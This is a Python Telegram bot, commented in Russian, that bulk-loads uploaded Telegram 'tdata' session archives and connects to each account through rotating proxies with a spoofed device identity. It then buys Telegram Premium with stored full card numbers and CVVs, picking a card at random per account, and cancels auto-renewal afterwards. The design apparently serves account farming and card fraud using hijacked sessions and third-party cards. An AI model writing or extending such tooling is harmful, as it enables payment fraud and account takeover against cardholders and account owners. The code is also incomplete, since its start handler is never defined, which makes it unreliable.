import asyncio
import json
import logging
import random
import shutil
import sqlite3
import time
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Set

from telethon import TelegramClient
from telethon.tl.functions.payments import SendPaymentFormRequest, GetPaymentFormRequest
from telethon.tl.types import (
    PaymentRequestedInfo,
    DataJSON,
    InputPaymentCredentials
)
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

from config import *
from tdata_converter import DirectTDataManager

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOGS_DIR / 'premium_bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

SUPPORTED_ARCHIVE_SUFFIXES = {
    '.zip',
    '.tar',
    '.gz',
    '.tar.gz',
    '.tgz',
    '.tar.bz2',
    '.tbz2',
    '.tar.xz',
    '.txz',
}

class PremiumBot:
    def __init__(self):
        self.db_conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        self.init_db()
        self.running = False
        self.tdata_manager = DirectTDataManager()
        
    def init_db(self):
        """Инициализация базы данных"""
        cursor = self.db_conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone TEXT UNIQUE,
                tdata_path TEXT,
                proxy TEXT,
                premium_until DATETIME,
                status TEXT DEFAULT 'active',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS cards (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                number TEXT,
                expiry_month INTEGER,
                expiry_year INTEGER,
                cvv TEXT,
                holder TEXT,
                status TEXT DEFAULT 'active',
                used_count INTEGER DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.db_conn.commit()
        logger.info("✅ База данных инициализирована")

    def load_proxies(self) -> List[str]:
        """Загрузка прокси из файла"""
        proxies = []
        if PROXIES_FILE.exists():
            try:
                with open(PROXIES_FILE, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            proxies.append(line)
                logger.info(f"📁 Загружено {len(proxies)} прокси")
            except Exception as e:
                logger.error(f"❌ Ошибка загрузки прокси: {e}")
        return proxies

    @staticmethod
    def extract_purchase_link(invoice_message) -> Optional[str]:
        """Пытается извлечь ссылку на оплату из инвойса."""
        reply_markup = getattr(invoice_message, 'reply_markup', None)
        if reply_markup:
            for row in getattr(reply_markup, 'rows', []):
                for button in getattr(row, 'buttons', []):
                    url = getattr(button, 'url', None)
                    if url:
                        return url
        return None

    def load_cards_from_db(self) -> List[Dict]:
        """Загрузка карт из базы"""
        cursor = self.db_conn.cursor()
        cursor.execute('''
            SELECT id, number, expiry_month, expiry_year, cvv, holder 
            FROM cards WHERE status = "active"
        ''')
        cards = []
        for row in cursor.fetchall():
            cards.append({
                'id': row[0],
                'number': row[1],
                'expiry_month': row[2],
                'expiry_year': row[3],
                'cvv': row[4],
                'holder': row[5]
            })
        return cards

    def get_unused_card(self) -> Optional[Dict]:
        """Получение случайной неиспользованной карты"""
        cards = self.load_cards_from_db()
        if cards:
            return random.choice(cards)
        return None

    def mark_card_used(self, card_id: int):
        """Пометка карты как использованной"""
        cursor = self.db_conn.cursor()
        cursor.execute('UPDATE cards SET used_count = used_count + 1 WHERE id = ?', (card_id,))
        self.db_conn.commit()

    def extract_tdata_archives(self):
        """Распаковка архивов с tdata"""
        logger.info("📦 Проверяем архивы в папке archives/")

        if not ARCHIVES_DIR.exists():
            ARCHIVES_DIR.mkdir(parents=True, exist_ok=True)

        archive_files = [
            path
            for path in ARCHIVES_DIR.iterdir()
            if path.is_file() and ''.join(path.suffixes).lower() in SUPPORTED_ARCHIVE_SUFFIXES
        ]

        if not archive_files:
            logger.info("📭 Архивы не найдены")
            return

        processed_dir = ARCHIVES_DIR / "processed"
        processed_dir.mkdir(exist_ok=True)

        for archive_path in archive_files:
            try:
                logger.info("📦 Распаковываем: %s", archive_path.name)

                extract_dir = ACCOUNTS_DIR / archive_path.stem
                extract_dir.mkdir(exist_ok=True)

                shutil.unpack_archive(str(archive_path), str(extract_dir))

                logger.info("✅ Распакован: %s -> %s", archive_path.name, extract_dir)

                archive_path.rename(processed_dir / archive_path.name)

            except shutil.ReadError:
                logger.error("❌ Формат архива не поддерживается: %s", archive_path.name)
            except Exception as e:  # pylint: disable=broad-except
                logger.error("❌ Ошибка распаковки %s: %s", archive_path, e)

    def scan_and_convert_accounts(
        self,
        *,
        extract_archives: bool = True,
        only_new: bool = False,
    ) -> List[Dict]:
        """Сканирует tdata папки напрямую и сохраняет их в базу."""
        logger.info("🔄 Сканируем tdata папки...")

        if extract_archives:
            self.extract_tdata_archives()

        accounts = self.tdata_manager.scan_tdata_accounts()
        proxies = self.load_proxies()

        cursor = self.db_conn.cursor()
        existing_phones: Set[str] = set()
        if only_new:
            cursor.execute("SELECT phone FROM accounts")
            existing_phones = {row[0] for row in cursor.fetchall()}

        new_accounts: List[Dict] = []

        for i, account in enumerate(accounts):
            proxy = account.get('proxy')
            if not proxy and proxies:
                proxy = proxies[i % len(proxies)]

            try:
                cursor.execute(
                    '''
                    INSERT OR REPLACE INTO accounts
                    (phone, tdata_path, proxy)
                    VALUES (?, ?, ?)
                    ''',
                    (
                        account['phone'],
                        str(account['tdata_path']),
                        proxy,
                    ),
                )
                account['proxy'] = proxy
                if only_new and account['phone'] not in existing_phones:
                    new_accounts.append(account)
                logger.info("✅ Аккаунт добавлен/обновлён: %s", account['phone'])
            except Exception as e:  # pylint: disable=broad-except
                logger.error("❌ Ошибка добавления аккаунта %s: %s", account['phone'], e)

        self.db_conn.commit()

        result_accounts = new_accounts if only_new else accounts
        logger.info("📊 Обработано аккаунтов: %s", len(result_accounts))
        return result_accounts

    async def create_telegram_client(self, account_data: Dict) -> Optional[TelegramClient]:
        """Создание клиента напрямую из tdata"""
        try:
            proxy = None
            if account_data.get('proxy'):
                proxy_str = account_data['proxy']
                # Парсим прокси в формате telethon
                if ':' in proxy_str:
                    parts = proxy_str.split(':')
                    if len(parts) == 6:  # ip:port:login:pass:type:region
                        proxy = {
                            'proxy_type': 'http',
                            'addr': parts[0],
                            'port': int(parts[1]),
                            'username': parts[2],
                            'password': parts[3]
                        }
                    elif len(parts) == 2:  # ip:port
                        proxy = {
                            'proxy_type': 'http', 
                            'addr': parts[0],
                            'port': int(parts[1])
                        }

            tdata_path = account_data.get('tdata_path')
            if tdata_path and tdata_path.exists():
                logger.info(f"📁 Используем tdata напрямую: {tdata_path}")
                
                # Используем родительскую папку tdata как сессию
                session_path = tdata_path.parent
                
                client = TelegramClient(
                    str(session_path),
                    API_ID, 
                    API_HASH,
                    proxy=proxy,
                    device_model="Samsung Galaxy S21",
                    system_version="Android 12",
                    app_version="8.7.2",
                    lang_code="en",
                    system_lang_code="en-US"
                )
                return client
            
            return None
            
        except Exception as e:
            logger.error(f"❌ Ошибка создания клиента: {e}")
            return None

    async def test_session(self, account_data: Dict) -> bool:
        """Тестирование tdata сессии"""
        client = None
        try:
            client = await self.create_telegram_client(account_data)
            if not client:
                logger.error("❌ Не удалось создать клиент")
                return False
            
            await client.connect()
            
            # Даем время на подключение
            await asyncio.sleep(3)
            
            if await client.is_user_authorized():
                me = await client.get_me()
                logger.info(f"✅ TData сессия активна: {me.phone}")
                return True
            else:
                logger.error(f"❌ TData сессия не авторизована")
                return False
                
        except Exception as e:
            logger.error(f"❌ Ошибка тестирования tdata: {e}")
            return False
        finally:
            if client:
                await client.disconnect()

    async def check_premium_status(self, client: TelegramClient) -> bool:
        """Проверка статуса Premium"""
        try:
            me = await client.get_me()
            return getattr(me, 'premium', False)
        except Exception as e:
            logger.error(f"❌ Ошибка проверки Premium: {e}")
            return False

    async def initiate_premium_payment(self, client: TelegramClient, account_phone: str) -> Dict:
        """Инициирует платеж за Premium"""
        try:
            premium_bot = await client.get_entity('PremiumBot')
            
            await client.send_message(premium_bot, '/start')
            await asyncio.sleep(2)
            
            await client.send_message(premium_bot, 'Buy Premium')
            await asyncio.sleep(3)
            
            messages = await client.get_messages(premium_bot, limit=10)

            invoice_message = None
            for message in messages:
                if hasattr(message, 'invoice'):
                    invoice_message = message
                    logger.info("💰 Найден инвойс для оплаты Premium")
                    break

            if invoice_message and hasattr(invoice_message, 'invoice'):
                invoice = invoice_message.invoice
                logger.info(f"💳 Инвойс найден: {invoice.currency} {invoice.total_amount / 100}")

                purchase_link = self.extract_purchase_link(invoice_message)

                try:
                    payment_form = await client(GetPaymentFormRequest(invoice_message.peer_id, invoice_message.id))
                    form_link = getattr(payment_form, 'bot_url', None)
                    if form_link:
                        purchase_link = form_link
                except Exception as exc:  # pylint: disable=broad-except
                    logger.debug("Не удалось получить ссылку через GetPaymentFormRequest: %s", exc)

                return {
                    'invoice_message': invoice_message,
                    'amount': invoice.total_amount / 100,
                    'currency': invoice.currency,
                    'purchase_link': purchase_link,
                    'success': True
                }
            else:
                return {
                    'success': False, 
                    'error': 'Не удалось найти платежную форму'
                }
            
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации платежа: {e}")
            return {'success': False, 'error': str(e)}

    async def create_payment_credentials(self, card_data: Dict) -> Optional[InputPaymentCredentials]:
        """Создает credentials для платежа"""
        try:
            card_number = card_data['number'].replace(' ', '')
            expiry_month = str(card_data['expiry_month']).zfill(2)
            expiry_year = str(card_data['expiry_year'])[2:]
            
            credentials_data = {
                "card_number": card_number,
                "expire_month": expiry_month,
                "expire_year": expiry_year,
                "card_cvv": card_data['cvv'],
                "card_holder": card_data['holder'],
                "save_card": False
            }
            
            data_json = DataJSON(data=json.dumps(credentials_data))
            
            credentials = InputPaymentCredentials(
                data=data_json,
                save=True
            )
            
            logger.info(f"✅ Credentials созданы для карты ****{card_number[-4:]}")
            return credentials
            
        except Exception as e:
            logger.error(f"❌ Ошибка создания credentials: {e}")
            return None

    async def fill_card_data_and_send_payment(self, client: TelegramClient, invoice_message, card_data: Dict, account_phone: str) -> Dict:
        """Заполняет данные карты и отправляет платежную форму"""
        try:
            payment_info = PaymentRequestedInfo()
            
            credentials = await self.create_payment_credentials(card_data)
            if not credentials:
                return {'success': False, 'error': 'Не удалось создать credentials для платежа'}
            
            logger.info(f"💳 Заполняем данные карты для {account_phone}")
            
            result = await client(SendPaymentFormRequest(
                msg_id=invoice_message.id,
                requested_info=payment_info,
                credentials=credentials,
                tip_amount=None
            ))
            
            logger.info(f"💰 Платежная форма отправлена для {account_phone}")
            logger.info("📱 Требуется подтверждение 3D Secure в банковском приложении!")
            
            return {
                'success': True,
                'message': 'Данные карты заполнены. Подтвердите 3D Secure в банковском приложении.',
                'requires_3ds_confirmation': True
            }
            
        except Exception as e:
            error_msg = str(e)
            logger.error(f"❌ Ошибка отправки платежной формы: {error_msg}")
            return {'success': False, 'error': f'Ошибка платежа: {error_msg}'}

    async def cancel_auto_renew(self, client: TelegramClient) -> bool:
        """Отмена автопродления Premium через @premiumbot"""
        try:
            premium_bot = await client.get_entity('PremiumBot')
            
            await client.send_message(premium_bot, '/stop')
            await asyncio.sleep(2)
            
            messages = await client.get_messages(premium_bot, limit=5)
            for message in messages:
                if hasattr(message, 'reply_markup') and message.reply_markup:
                    for row in message.reply_markup.rows:
                        for button in row.buttons:
                            text = getattr(button, 'text', '').lower()
                            if any(word in text for word in ['отменить', 'cancel', 'stop', 'отмена']):
                                await button.click()
                                logger.info("✅ Автопродление отменено")
                                return True
            
            logger.warning("⚠️ Не удалось найти кнопку отмены автопродления")
            return False
            
        except Exception as e:
            logger.error(f"❌ Ошибка отмены автопродления: {e}")
            return False

    async def process_premium_payment(self, account_data: Dict, card_data: Dict) -> Dict:
        """Обработка платежа за Premium с данными карты"""
        client = None
        try:
            client = await self.create_telegram_client(account_data)
            if not client:
                return {'success': False, 'error': 'Не удалось создать клиент'}
            
            await client.connect()
            
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'TData сессия не авторизована'}
            
            try:
                me = await client.get_me()
                logger.info(f"✅ Авторизован как: {me.phone}")
            except Exception as e:
                logger.error(f"❌ Ошибка авторизации: {e}")
                return {'success': False, 'error': 'Ошибка авторизации'}
            
            if await self.check_premium_status(client):
                logger.info("✅ Уже имеет Premium")
                return {'success': True, 'message': 'Уже имеет Premium'}
            
            payment_init = await self.initiate_premium_payment(client, account_data['phone'])
            if not payment_init['success']:
                return payment_init
            
            payment_result = await self.fill_card_data_and_send_payment(
                client,
                payment_init['invoice_message'],
                card_data,
                account_data['phone']
            )

            payment_result['purchase_link'] = payment_init.get('purchase_link')

            return payment_result

        except Exception as e:
            logger.error(f"💥 Ошибка обработки платежа: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            if client:
                await client.disconnect()

    async def verify_premium_and_cancel_renew(self, account_data: Dict) -> Dict:
        """Проверка Premium и отмена автопродления"""
        client = None
        try:
            client = await self.create_telegram_client(account_data)
            if not client:
                return {'success': False, 'error': 'Не удалось создать клиент'}
            
            await client.connect()
            
            has_premium = await self.check_premium_status(client)
            
            if has_premium:
                cancel_success = await self.cancel_auto_renew(client)
                
                cursor = self.db_conn.cursor()
                premium_until = datetime.now() + timedelta(days=30)
                
                cursor.execute('''
                    UPDATE accounts 
                    SET premium_until = ?, status = 'premium' 
                    WHERE phone = ?
                ''', (premium_until, account_data['phone']))
                
                self.db_conn.commit()
                
                return {
                    'success': True,
                    'premium_activated': True,
                    'auto_renew_cancelled': cancel_success,
                    'message': 'Premium активирован!' + (' Автопродление отменено!' if cancel_success else '')
                }
            else:
                return {
                    'success': False,
                    'error': 'Premium не активирован на аккаунте'
                }
                
        except Exception as e:
            logger.error(f"❌ Ошибка проверки Premium: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            if client:
                await client.disconnect()

    async def process_single_account(self, account_data: Dict, update: Update = None) -> Dict:
        """Обработка аккаунта"""
        try:
            logger.info(f"🔧 Обрабатываем: {account_data['phone']}")

            max_retries = max(1, MAX_RETRIES)
            session_ok = False

            for attempt in range(max_retries):
                logger.info(f"🔄 Попытка подключения {attempt + 1}/{max_retries}")
                session_ok = await self.test_session(account_data)
                if session_ok:
                    break
                if attempt < max_retries - 1:
                    logger.info("⏳ Повторная попытка через 5 секунд...")
                    await asyncio.sleep(5)

            if not session_ok:
                return {'success': False, 'error': 'TData сессия не авторизована'}

            card_data = self.get_unused_card()
            if not card_data:
                return {'success': False, 'error': 'Нет доступных карт'}

            logger.info(f"💳 Используем карту: ****{card_data['number'][-4:]}")

            payment_result = await self.process_premium_payment(account_data, card_data)

            purchase_link = payment_result.get('purchase_link')
            if purchase_link and update:
                await update.message.reply_text(
                    f"🔗 Ссылка на оплату для {account_data['phone']}:\n{purchase_link}"
                )

            if payment_result.get('requires_3ds_confirmation'):
                logger.info("⏳ Ожидаем подтверждения 3D Secure в банковском приложении...")
                if update:
                    await update.message.reply_text(
                        f"📱 {account_data['phone']}:\n"
                        "💳 Данные карты заполнены!\n"
                        "📱 Подтвердите 3D Secure в банковском приложении\n"
                        f"⏳ Ожидаем {BANK_CONFIRMATION_DELAY} секунд..."
                    )

                await asyncio.sleep(BANK_CONFIRMATION_DELAY)

                logger.info("✅ Проверяем активацию после подтверждения 3D Secure...")
                verification_result = await self.verify_premium_and_cancel_renew(account_data)

                if verification_result['success']:
                    self.mark_card_used(card_data['id'])
                    return {
                        'success': True,
                        'message': verification_result['message'],
                        'premium_activated': True,
                        'card_masked': f"****{card_data['number'][-4:]}",
                        'purchase_link': purchase_link,
                    }

                return {
                    'success': False,
                    'error': verification_result.get('error', 'Premium не активирован после 3D Secure'),
                    'purchase_link': purchase_link,
                }

            if payment_result.get('success'):
                self.mark_card_used(card_data['id'])
                return {
                    'success': True,
                    'message': payment_result['message'],
                    'premium_activated': True,
                    'card_masked': f"****{card_data['number'][-4:]}",
                    'purchase_link': purchase_link,
                }

            return {
                'success': False,
                'error': payment_result.get('error', 'Неизвестная ошибка оплаты'),
                'purchase_link': purchase_link,
            }

        except Exception as e:
            logger.error(f"💥 Ошибка обработки: {e}")
            return {'success': False, 'error': str(e)}

    async def process_accounts_background(self, accounts: List[Dict], update: Update):
        """Фоновая обработка"""
        success_count = 0
        total_count = len(accounts)

        for i, account in enumerate(accounts):
            if not self.running:
                break

            result = await self.process_single_account(account, update)

            status_msg = f"📱 {account['phone']}:\n"

            if result.get('success'):
                success_count += 1
                status_msg += result.get('message', '✅ Premium активирован! 🎉') + "\n"
                if result.get('card_masked'):
                    status_msg += f"💳 Карта: {result.get('card_masked')}\n"
            else:
                status_msg += f"❌ {result.get('error')}\n"
                if result.get('purchase_link'):
                    status_msg += f"🔗 Ссылка: {result['purchase_link']}\n"

            await update.message.reply_text(status_msg)

            if (i + 1) % 2 == 0:
                await update.message.reply_text(f"📊 Прогресс: {i+1}/{total_count} | ✅: {success_count}")

            if i + 1 < total_count:
                await asyncio.sleep(DELAY_BETWEEN_ACCOUNTS)

        await update.message.reply_text(f"🎯 Завершено! ✅: {success_count}/{total_count}")
        self.running = False

    async def scan_tdata(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Принудительное сканирование tdata папок"""
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Нет прав")
            return

        await update.message.reply_text("🔍 Сканирую tdata папки...")

        accounts = self.scan_and_convert_accounts()

        if accounts:
            await update.message.reply_text(
                f"✅ Найдено {len(accounts)} аккаунтов\n"
                f"💡 Используйте /start для запуска покупки Premium"
            )
        else:
            await update.message.reply_text("❌ TData папки не найдены")

    async def handle_tdata_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка загруженных tdata архивов и файлов прокси."""
        if update.effective_user is None or update.message is None:
            return

        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Нет прав")
            return

        document = update.message.document
        if not document:
            return

        file_name = document.file_name or ""
        suffixes = ''.join(Path(file_name).suffixes).lower()
        is_proxy_file = file_name and file_name.lower().endswith('.txt') and 'proxy' in file_name.lower()

        try:
            telegram_file = await context.bot.get_file(document.file_id)
        except Exception as exc:  # pylint: disable=broad-except
            await update.message.reply_text(f"❌ Не удалось получить файл: {exc}")
            return

        if is_proxy_file:
            try:
                await telegram_file.download_to_drive(str(PROXIES_FILE))
                count = len(self.load_proxies())
                await update.message.reply_text(
                    f"✅ Файл прокси обновлён ({count} шт.).\n"
                    "🔄 Новые прокси будут назначены при следующем сканировании аккаунтов."
                )
            except Exception as exc:  # pylint: disable=broad-except
                await update.message.reply_text(f"❌ Ошибка сохранения файла прокси: {exc}")
            return

        if suffixes not in SUPPORTED_ARCHIVE_SUFFIXES:
            await update.message.reply_text(
                "❌ Неподдерживаемый формат. Загрузите архив tdata (zip/tar/tgz)."
            )
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_name = file_name or f"tdata_{timestamp}.zip"
        destination = ARCHIVES_DIR / f"{timestamp}_{safe_name}"

        try:
            await telegram_file.download_to_drive(str(destination))
            await update.message.reply_text(
                "📥 Архив получен! Распаковываю и добавляю аккаунты..."
            )

            self.extract_tdata_archives()
            new_accounts = self.scan_and_convert_accounts(extract_archives=False, only_new=True)

            if new_accounts:
                accounts_list = '\n'.join(f"• {acc['phone']}" for acc in new_accounts[:10])
                more_text = "" if len(new_accounts) <= 10 else "\n…"
                await update.message.reply_text(
                    "✅ Новые аккаунты добавлены: "
                    f"{len(new_accounts)} шт.\n" + accounts_list + more_text
                )
            else:
                await update.message.reply_text("⚠️ Новых аккаунтов в архиве не обнаружено")

        except Exception as exc:  # pylint: disable=broad-except
            logger.error("❌ Ошибка обработки загруженного архива: %s", exc)
            await update.message.reply_text(f"❌ Ошибка обработки архива: {exc}")

    async def add_card(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Добавление карты"""
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Нет прав")
            return

        if not context.args:
            await update.message.reply_text(
                "❌ Формат: /add_card номер|месяц|год|cvv|владелец\n\n"
                "💳 Пример:\n"
                "/add_card 1234567812345678|12|2025|123|IVAN IVANOV"
            )
            return

        card_data_str = ' '.join(context.args)
        parts = card_data_str.split('|')
        
        if len(parts) < 5:
            await update.message.reply_text("❌ Неверный формат. Нужно 5 параметров")
            return

        try:
            number = parts[0].strip()
            expiry_month = int(parts[1].strip())
            expiry_year = int(parts[2].strip())
            cvv = parts[3].strip()
            holder = parts[4].strip()
            
            cursor = self.db_conn.cursor()
            cursor.execute('''
                INSERT INTO cards (number, expiry_month, expiry_year, cvv, holder) 
                VALUES (?, ?, ?, ?, ?)
            ''', (number, expiry_month, expiry_year, cvv, holder))
            
            self.db_conn.commit()
            
            masked = number[-4:].rjust(len(number), '*')
            await update.message.reply_text(f"✅ Карта {masked} добавлена")
            
        except Exception as e:
            await update.message.reply_text(f"❌ Ошибка добавления карты: {e}")

    async def list_cards(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Список карт"""
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Нет прав")
            return

        cards = self.load_cards_from_db()
        if not cards:
            await update.message.reply_text("📭 Нет добавленных карт")
            return
        
        message = "💳 Добавленные карты:\n\n"
        for card in cards:
            masked = card['number'][-4:].rjust(len(card['number']), '*')
            message += f"🔸 {masked}\n"
            message += f"   📅 {card['expiry_month']:02d}/{card['expiry_year']}\n"
            message += f"   👤 {card['holder']}\n\n"
        
        await update.message.reply_text(message)

    async def stop_processing(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Остановка"""
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Нет прав")
            return

        self.running = False
        await update.message.reply_text("🛑 Остановлено.")

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Справка"""
        help_text = (
            "🤖 Бот для покупки Telegram Premium\n\n"
            "⚡ Команды:\n"
            "/start - запустить процесс покупки Premium\n"
            "/stop - остановить процесс\n"
            "/add_card номер|месяц|год|cvv|владелец - добавить карту\n"
            "/list_cards - список карт\n"
            "/scan_tdata - сканировать tdata папки\n"
            "/help - справка\n\n"
            "📁 Подготовка аккаунтов:\n"
            "1. Отправьте архивы tdata (zip/tar) боту или поместите их в папку archives/\n"
            "2. При необходимости загрузите файл proxies.txt с прокси\n"
            "3. Используйте /scan_tdata для обновления базы аккаунтов\n"
            "4. Добавьте карты /add_card\n"
            "5. Запустите /start для покупки Premium\n\n"
            "🔐 После оплаты:\n"
            "- Подтвердите 3D Secure в банковском приложении\n"
            "- Бот автоматически проверит активацию Premium\n"
            "- Отменит автопродление через @premiumbot"
        )
        await update.message.reply_text(help_text)

def main():
    """Главная функция"""
    try:
        bot = PremiumBot()
        application = Application.builder().token(BOT_TOKEN).build()

        application.add_handler(CommandHandler("start", bot.start_processing))
        application.add_handler(CommandHandler("stop", bot.stop_processing))
        application.add_handler(CommandHandler("add_card", bot.add_card))
        application.add_handler(CommandHandler("list_cards", bot.list_cards))
        application.add_handler(CommandHandler("scan_tdata", bot.scan_tdata))
        application.add_handler(CommandHandler("help", bot.help_command))
        application.add_handler(MessageHandler(filters.Document.ALL, bot.handle_tdata_upload))

        logger.info("🤖 Бот запускается...")
        print("=" * 50)
        print("🎉 Premium Bot с автоматическими TData запущен!")
        print("📁 Просто закиньте tdata папки в accounts/")
        print("💳 Используйте /add_card для добавления карт")
        print("🚀 Используйте /start для запуска покупки")
        print("=" * 50)
        
        application.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        logger.error(f"Ошибка запуска: {e}")
        print(f"❌ Ошибка: {e}")

if __name__ == "__main__":
    main()
